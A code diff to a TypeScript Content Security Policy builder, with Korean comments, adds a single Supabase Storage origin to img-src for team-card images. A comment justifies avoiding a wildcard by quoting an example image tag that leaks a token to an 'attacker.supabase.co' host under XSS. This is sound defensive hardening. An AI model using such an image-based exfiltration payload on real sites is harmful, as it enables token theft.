@@ -15,6 +15,14 @@ export interface CspOptions {
   apiBaseUrl?: string;
   /** NEXT_PUBLIC_PUBLIC_SITE_ORIGIN. 팀 카드 미리보기 이미지(공개 사이트 기준 상대경로) 표시에 필요 */
   publicSiteOrigin?: string;
+  /**
+   * NEXT_PUBLIC_SUPABASE_STORAGE_ORIGIN. 업로드한 팀 카드 이미지(`https://<ref>.supabase.co/...`) 표시에 필요.
+   *
+   * `https://*.supabase.co` 와일드카드를 쓰지 않는 이유: supabase.co 하위 프로젝트는 누구나 무료로 만들 수 있어
+   * 와일드카드는 사실상 "임의의 서버로 이미지 요청을 보내도 된다"가 된다. img-src는 XSS 상황에서
+   * `<img src="https://attacker.supabase.co/?=토큰">` 형태의 유출 통로가 되므로 우리 프로젝트 오리진 하나로 좁힌다.
+   */
+  supabaseStorageOrigin?: string;
   /** 개발 서버는 React Refresh(eval)와 HMR 웹소켓이 필요하다 */
   isDev: boolean;
 }
@@ -33,11 +41,18 @@ export function toOrigin(value: string | undefined): string | undefined {
 export function buildContentSecurityPolicy(options: CspOptions): string {
   const apiOrigin = toOrigin(options.apiBaseUrl);
   const siteOrigin = toOrigin(options.publicSiteOrigin);
+  const storageOrigin = toOrigin(options.supabaseStorageOrigin);
 
-  // TODO(7c-2~4): 이미지 호스트는 화면이 실제로 쓰게 될 때 추가한다(미리 열어 두지 않는다 — 최소 권한).
-  //   7c-2 팀 카드: Supabase Storage(https://*.supabase.co), 7c-3 앨범 커버: https://is1-ssl.mzstatic.com,
-  //   7c-4 유튜브 썸네일: https://i.ytimg.com
-  const imgSrc = ["'self'", "data:", "blob:", ...(siteOrigin ? [siteOrigin] : [])];
+  // 이미지 호스트는 화면이 실제로 쓰게 될 때만 추가한다(미리 열어 두지 않는다 — 최소 권한).
+  //   7c-2(지금): 팀 카드 — Supabase Storage 오리진. 선택 전 로컬 미리보기가 blob:을 쓴다
+  //   TODO(7c-3): 앨범 커버 https://is1-ssl.mzstatic.com, TODO(7c-4): 유튜브 썸네일 https://i.ytimg.com
+  const imgSrc = [
+    "'self'",
+    "data:",
+    "blob:",
+    ...(siteOrigin ? [siteOrigin] : []),
+    ...(storageOrigin ? [storageOrigin] : []),
+  ];
   const connectSrc = ["'self'", ...(apiOrigin ? [apiOrigin] : []), ...(options.isDev ? ["ws://localhost:*"] : [])];
   const scriptSrc = ["'self'", "'unsafe-inline'", ...(options.isDev ? ["'unsafe-eval'"] : [])];
 
